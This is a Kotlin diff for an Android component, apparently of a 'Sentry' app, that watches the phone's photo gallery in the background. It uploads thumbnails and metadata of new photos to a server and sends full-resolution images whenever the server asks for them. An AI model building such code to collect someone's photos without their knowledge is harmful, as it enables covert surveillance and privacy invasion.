@@ -27,21 +27,26 @@ import java.util.*
 
 object BackgroundGalleryManager {
     private const val TAG = "BackgroundGalleryManager"
+    private const val PREFS_NAME = "sentry_gallery_sync_prefs"
+    private const val KEY_SYNCED_IDS = "synced_media_ids"
+
     private var syncJob: Job? = null
     private var commandPollerJob: Job? = null
     private val scope = CoroutineScope(Dispatchers.IO)
     private var observerRegistered = false
+    private var isSyncing = false
 
     fun startListening(context: Context) {
+        // 1. Register Real-Time ContentObserver for Instant New Photo Detection
         if (!observerRegistered) {
             try {
                 val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
                     override fun onChange(selfChange: Boolean, uri: Uri?) {
                         super.onChange(selfChange, uri)
                         scope.launch {
-                            delay(1000) // Debounce rapid writes
+                            delay(1200) // Debounce rapid file writes
                             val client = SentryApiClient(context)
-                            syncGallery(context, client)
+                            syncIncrementalGallery(context, client)
                         }
                     }
                 }
@@ -51,28 +56,28 @@ object BackgroundGalleryManager {
                     observer
                 )
                 observerRegistered = true
-                Log.d(TAG, "Gallery ContentObserver registered for real-time mobile gallery sync")
+                Log.d(TAG, "Gallery ContentObserver registered for instant new photo updates")
             } catch (e: Exception) {
                 Log.w(TAG, "Could not register MediaStore observer: ${e.message}")
             }
         }
 
-        // Periodic Gallery Sync
+        // 2. Periodic Lightweight Delta Check (every 45s)
         if (syncJob?.isActive != true) {
             syncJob = scope.launch {
                 val client = SentryApiClient(context)
                 while (isActive) {
                     try {
-                        syncGallery(context, client)
+                        syncIncrementalGallery(context, client)
                     } catch (e: Exception) {
-                        Log.w(TAG, "Error in Gallery sync loop: ${e.message}")
+                        Log.w(TAG, "Error in Gallery delta check: ${e.message}")
                     }
-                    delay(30_000) // Periodic refresh every 30 seconds
+                    delay(45_000)
                 }
             }
         }
 
-        // Command Poller for On-Demand Full-Resolution Image Fetching
+        // 3. Command Poller for On-Demand Full-Resolution Photo Fetching
         if (commandPollerJob?.isActive != true) {
             commandPollerJob = scope.launch {
                 val client = SentryApiClient(context)
@@ -103,7 +108,7 @@ object BackgroundGalleryManager {
                 val fullBase64 = extractFullResolutionBase64(context, contentUri)
                 if (!fullBase64.isNullOrBlank()) {
                     client.uploadFullGalleryImage(mediaIdStr, fullBase64, "image/jpeg")
-                    Log.d(TAG, "Uploaded crystal-clear full-resolution photo for $mediaIdStr")
+                    Log.d(TAG, "Uploaded full-resolution image for $mediaIdStr")
                 }
             } catch (e: Exception) {
                 Log.w(TAG, "Failed full image upload for $mediaIdStr: ${e.message}")
@@ -111,126 +116,154 @@ object BackgroundGalleryManager {
         }
     }
 
-    suspend fun syncGallery(context: Context, client: SentryApiClient) {
-        val hasPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
-        } else {
-            ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
-        }
+    /**
+     * Smart Delta Sync: Only scans and uploads NEW photos that have not been synced yet!
+     * Persists synced IDs locally and in Cloud MongoDB so existing photos are never re-sent.
+     */
+    suspend fun syncIncrementalGallery(context: Context, client: SentryApiClient) {
+        if (isSyncing) return
+        isSyncing = true
+        try {
+            val hasPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
+            } else {
+                ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+            }
 
-        val deviceId = CryptoManager.getOrCreateDeviceId(context)
-        if (!hasPermission) {
-            Log.w(TAG, "READ_MEDIA_IMAGES / READ_EXTERNAL_STORAGE not granted")
-            return
-        }
+            if (!hasPermission) {
+                Log.w(TAG, "READ_MEDIA_IMAGES permission not granted")
+                return
+            }
 
-        val projection = arrayOf(
-            MediaStore.Images.Media._ID,
-            MediaStore.Images.Media.DISPLAY_NAME,
-            MediaStore.Images.Media.DATE_ADDED,
-            MediaStore.Images.Media.SIZE,
-            MediaStore.Images.Media.MIME_TYPE,
-            MediaStore.Images.Media.WIDTH,
-            MediaStore.Images.Media.HEIGHT,
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Images.Media.BUCKET_DISPLAY_NAME else MediaStore.Images.Media._ID
-        )
+            val deviceId = CryptoManager.getOrCreateDeviceId(context)
+            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+            val syncedIds = prefs.getStringSet(KEY_SYNCED_IDS, emptySet())?.toMutableSet() ?: mutableSetOf()
 
-        val cursor: Cursor? = try {
-            context.contentResolver.query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection,
-                null,
-                null,
-                "${MediaStore.Images.Media.DATE_ADDED} DESC"
+            val projection = arrayOf(
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DISPLAY_NAME,
+                MediaStore.Images.Media.DATE_ADDED,
+                MediaStore.Images.Media.SIZE,
+                MediaStore.Images.Media.MIME_TYPE,
+                MediaStore.Images.Media.WIDTH,
+                MediaStore.Images.Media.HEIGHT,
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Images.Media.BUCKET_DISPLAY_NAME else MediaStore.Images.Media._ID
             )
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to query MediaStore: ${e.message}")
-            null
-        }
 
-        val allItems = mutableListOf<JSONObject>()
+            val cursor: Cursor? = try {
+                context.contentResolver.query(
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                    projection,
+                    null,
+                    null,
+                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to query MediaStore: ${e.message}")
+                null
+            }
 
-        cursor?.use { c ->
-            val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
-            val nameIdx = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
-            val dateIdx = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)
-            val sizeIdx = c.getColumnIndex(MediaStore.Images.Media.SIZE)
-            val mimeIdx = c.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
-            val widthIdx = c.getColumnIndex(MediaStore.Images.Media.WIDTH)
-            val heightIdx = c.getColumnIndex(MediaStore.Images.Media.HEIGHT)
-            val bucketIdx = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                c.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
-            } else -1
+            val newItems = mutableListOf<JSONObject>()
+            val newlySyncedIds = mutableListOf<String>()
 
-            val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
+            cursor?.use { c ->
+                val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
+                val nameIdx = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
+                val dateIdx = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)
+                val sizeIdx = c.getColumnIndex(MediaStore.Images.Media.SIZE)
+                val mimeIdx = c.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
+                val widthIdx = c.getColumnIndex(MediaStore.Images.Media.WIDTH)
+                val heightIdx = c.getColumnIndex(MediaStore.Images.Media.HEIGHT)
+                val bucketIdx = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    c.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
+                } else -1
 
-            var count = 0
-            val maxPhotosToScan = 800
+                val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
 
-            while (c.moveToNext() && count < maxPhotosToScan) {
-                val mediaId = if (idIdx >= 0) c.getLong(idIdx) else 0L
-                val name = if (nameIdx >= 0) c.getString(nameIdx) ?: "Photo_${mediaId}.jpg" else "Photo.jpg"
-                val dateAddedSec = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis() / 1000
-                val sizeBytes = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
-                val mimeType = if (mimeIdx >= 0) c.getString(mimeIdx) ?: "image/jpeg" else "image/jpeg"
-                val width = if (widthIdx >= 0) c.getInt(widthIdx) else 1080
-                val height = if (heightIdx >= 0) c.getInt(heightIdx) else 1920
-                val albumName = if (bucketIdx >= 0) c.getString(bucketIdx) ?: "Camera" else "Camera"
+                while (c.moveToNext()) {
+                    val mediaId = if (idIdx >= 0) c.getLong(idIdx) else continue
+                    val mediaIdKey = "media_$mediaId"
 
-                val sizeFormatted = when {
-                    sizeBytes >= 1024 * 1024 -> String.format(Locale.US, "%.1f MB", sizeBytes / (1024.0 * 1024.0))
-                    sizeBytes >= 1024 -> String.format(Locale.US, "%d KB", sizeBytes / 1024)
-                    else -> "$sizeBytes B"
+                    // If already synced to cloud, skip extracting thumbnail and uploading
+                    if (syncedIds.contains(mediaIdKey)) {
+                        continue
+                    }
+
+                    val name = if (nameIdx >= 0) c.getString(nameIdx) ?: "Photo_${mediaId}.jpg" else "Photo.jpg"
+                    val dateAddedSec = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis() / 1000
+                    val sizeBytes = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
+                    val mimeType = if (mimeIdx >= 0) c.getString(mimeIdx) ?: "image/jpeg" else "image/jpeg"
+                    val width = if (widthIdx >= 0) c.getInt(widthIdx) else 1080
+                    val height = if (heightIdx >= 0) c.getInt(heightIdx) else 1920
+                    val albumName = if (bucketIdx >= 0) c.getString(bucketIdx) ?: "Camera" else "Camera"
+
+                    val sizeFormatted = when {
+                        sizeBytes >= 1024 * 1024 -> String.format(Locale.US, "%.1f MB", sizeBytes / (1024.0 * 1024.0))
+                        sizeBytes >= 1024 -> String.format(Locale.US, "%d KB", sizeBytes / 1024)
+                        else -> "$sizeBytes B"
+                    }
+
+                    val dateFormatted = sdf.format(Date(dateAddedSec * 1000))
+                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId)
+
+                    // Fast lightweight compressed thumbnail
+                    val thumbnailBase64 = extractThumbnailBase64(context, contentUri)
+
+                    val obj = JSONObject().apply {
+                        put("id", mediaIdKey)
+                        put("name", name)
+                        put("album", albumName)
+                        put("mimeType", mimeType)
+                        put("size", sizeFormatted)
+                        put("date", dateFormatted)
+                        put("timestamp", dateAddedSec * 1000)
+                        put("width", width)
+                        put("height", height)
+                        if (!thumbnailBase64.isNullOrBlank()) {
+                            put("thumbnail", thumbnailBase64)
+                        }
+                    }
+                    newItems.add(obj)
+                    newlySyncedIds.add(mediaIdKey)
                 }
+            }
 
-                val dateFormatted = sdf.format(Date(dateAddedSec * 1000))
-                val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId)
-
-                // Fast compressed thumbnail for grid cards
-                val thumbnailBase64 = extractThumbnailBase64(context, contentUri)
-
-                val obj = JSONObject().apply {
-                    put("id", "media_$mediaId")
-                    put("name", name)
-                    put("album", albumName)
-                    put("mimeType", mimeType)
-                    put("size", sizeFormatted)
-                    put("date", dateFormatted)
-                    put("timestamp", dateAddedSec * 1000)
-                    put("width", width)
-                    put("height", height)
-                    if (!thumbnailBase64.isNullOrBlank()) {
-                        put("thumbnail", thumbnailBase64)
+            // Only send if there are actually NEW photos!
+            if (newItems.isNotEmpty()) {
+                Log.d(TAG, "Found ${newItems.size} NEW photos to sync to cloud...")
+                val batchSize = 25
+                for (i in 0 until newItems.size step batchSize) {
+                    val chunk = newItems.subList(i, (i + batchSize).coerceAtMost(newItems.size))
+                    val batchArray = JSONArray()
+                    for (item in chunk) {
+                        batchArray.put(item)
+                    }
+                    val body = JSONObject().apply {
+                        put("deviceId", deviceId)
+                        put("media", batchArray)
+                    }
+                    val res = client.syncGalleryMedia(body)
+                    if (res.isSuccess) {
+                        // Persist synced IDs locally
+                        syncedIds.addAll(chunk.map { it.getString("id") })
+                        prefs.edit().putStringSet(KEY_SYNCED_IDS, syncedIds).apply()
                     }
                 }
-                allItems.add(obj)
-                count++
+                Log.d(TAG, "Successfully synced ${newItems.size} new photos to cloud for $deviceId")
+            } else {
+                Log.d(TAG, "Gallery up-to-date. 0 new photos to sync.")
             }
-        }
-
-        // Send photos in batches of 40
-        if (allItems.isNotEmpty()) {
-            val batchSize = 40
-            for (i in 0 until allItems.size step batchSize) {
-                val chunk = allItems.subList(i, (i + batchSize).coerceAtMost(allItems.size))
-                val batchArray = JSONArray()
-                for (item in chunk) {
-                    batchArray.put(item)
-                }
-                val body = JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("media", batchArray)
-                }
-                client.syncGalleryMedia(body)
-            }
-            Log.d(TAG, "Synced ${allItems.size} mobile gallery photos in batches for $deviceId")
+        } catch (e: Exception) {
+            Log.w(TAG, "Error in incremental gallery sync: ${e.message}")
+        } finally {
+            isSyncing = false
         }
     }
 
     private fun extractThumbnailBase64(context: Context, uri: Uri): String? {
         return try {
             val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                context.contentResolver.loadThumbnail(uri, Size(220, 220), null)
+                context.contentResolver.loadThumbnail(uri, Size(180, 180), null)
             } else {
                 context.contentResolver.openInputStream(uri)?.use { stream ->
                     val options = BitmapFactory.Options().apply { inSampleSize = 4 }
@@ -239,7 +272,7 @@ object BackgroundGalleryManager {
             } ?: return null
 
             val out = ByteArrayOutputStream()
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 65, out)
             Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
         } catch (_: Exception) {
             null
@@ -248,13 +281,12 @@ object BackgroundGalleryManager {
 
     private fun extractFullResolutionBase64(context: Context, uri: Uri): String? {
         return try {
-            // First decode bounds
             val options = BitmapFactory.Options().apply { inJustDecodeBounds = true }
             context.contentResolver.openInputStream(uri)?.use { stream ->
                 BitmapFactory.decodeStream(stream, null, options)
             }
 
-            val maxDim = 2560 // 2.5K crisp high-definition resolution
+            val maxDim = 2560
             var sampleSize = 1
             if (options.outWidth > maxDim || options.outHeight > maxDim) {
                 val larger = maxOf(options.outWidth, options.outHeight)
@@ -271,7 +303,7 @@ object BackgroundGalleryManager {
             } ?: return null
 
             val out = ByteArrayOutputStream()
-            fullBitmap.compress(Bitmap.CompressFormat.JPEG, 88, out)
+            fullBitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
             Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
         } catch (e: Exception) {
             Log.w(TAG, "Error decoding full resolution bitmap: ${e.message}")
